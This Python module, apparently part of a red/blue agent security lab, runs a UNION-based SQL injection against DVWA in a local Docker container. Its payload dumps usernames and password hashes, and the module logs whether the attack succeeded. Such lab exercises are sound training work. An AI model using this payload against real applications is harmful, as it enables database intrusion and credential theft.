"""
sql_injection_attack.py
Red Agent attack module: performs a classic SQL injection against DVWA's
SQL Injection page to extract data the app was never meant to return.

This targets ONLY the isolated Docker container (localhost:8080) defined
in docker-compose.yml. Never point this at any external system.
"""

from dvwa_session import DVWASession


def run_sql_injection(dvwa: DVWASession) -> dict:
    """
    Exploits DVWA's SQL Injection page using a classic UNION-based payload.
    Returns a structured result describing what was extracted, for logging
    by the Blue Agent later.
    """
    # Classic payload: '1' returns the normal single user, but this UNION
    # injection tricks the query into also returning all usernames + password hashes.
    payload = "1' UNION SELECT user, password FROM users -- -"

    resp = dvwa.get("/vulnerabilities/sqli/", params={"id": payload, "Submit": "Submit"})

    success = "admin" in resp.text and ("password" in resp.text.lower() or "5f4dcc3b" in resp.text)

    result = {
        "attack_type": "sql_injection",
        "target_endpoint": "/vulnerabilities/sqli/",
        "payload_used": payload,
        "success": success,
        "raw_response_snippet": resp.text[resp.text.find("First name"):resp.text.find("First name") + 500]
        if success else None,
    }

    if success:
        print("[!] SQL Injection succeeded. Extracted user data from the database.")
    else:
        print("[-] SQL Injection did not appear to succeed. Check DVWA security level (should be 'low').")

    return result


if __name__ == "__main__":
    dvwa = DVWASession()
    if dvwa.login():
        outcome = run_sql_injection(dvwa)
        print(outcome)